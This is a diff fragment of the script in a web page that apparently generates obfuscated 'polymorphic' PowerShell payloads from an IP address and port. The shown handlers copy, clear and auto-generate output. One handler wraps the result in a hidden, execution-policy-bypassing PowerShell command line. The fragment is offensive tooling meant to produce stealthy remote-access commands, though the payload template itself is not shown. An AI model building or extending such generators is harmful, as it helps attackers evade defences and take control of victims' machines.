-    clearBtn.addEventListener('click', () => {
-        obfuscatedOutput.textContent = '# Payload will appear here...';
-        decodedOutput.textContent = '# Readable version will appear here...';
-        copyPayloadBtn.disabled = copyEncodedBtn.disabled = copyFullBtn.disabled = true;
-    });
+copyFullBtn.addEventListener('click', () => {
+    let fullCmd = obfuscatedOutput.textContent;
+    if (!fullCmd.includes('powershell')) {
+        if (b64Chk.checked) {
+            copyToClipboard(fullCmd, copyFullBtn);
+        } else {
+            const escaped = fullCmd.replace(/"/g, '`"');
+            fullCmd = `powershell -NoP -NonI -W Hidden -Exec Bypass -c "${escaped}"`;
+            copyToClipboard(fullCmd, copyFullBtn);
+        }
+    } else {
+        copyToClipboard(fullCmd, copyFullBtn);
+    }
+});
 
-    [ipInput, portInput].forEach(el => el.addEventListener('keypress', e => { if(e.key === 'Enter') handleGenerate(); }));
+clearBtn.addEventListener('click', () => {
+    obfuscatedOutput.innerHTML = '<span style="color: #4a5a7a;"># Click Generate to create polymorphic payload...</span>';
+    decodedOutput.innerHTML = '<span style="color: #4a5a7a;"># Decoded version will appear here after generation...</span>';
+    copyPayloadBtn.disabled = true;
+    copyEncodedBtn.disabled = true;
+    copyFullBtn.disabled = true;
+    currentPayload = '';
+    currentEncoded = '';
+});
+
+obfuscatedOutput.addEventListener('click', () => {
+    if (!copyPayloadBtn.disabled) {
+        const text = obfuscatedOutput.textContent;
+        copyToClipboard(text, copyPayloadBtn);
+    }
+});
+
+decodedOutput.addEventListener('click', () => {
+    const text = decodedOutput.textContent;
+    copyToClipboard(text, document.createElement('button'));
+});
+
+[ipInput, portInput].forEach(el => {
+    el.addEventListener('keypress', e => {
+        if (e.key === 'Enter') handleGenerate();
+    });
+});
+
+document.addEventListener('DOMContentLoaded', () => {
+    setTimeout(handleGenerate, 300);
+});
 </script>
 </body>
 </html>
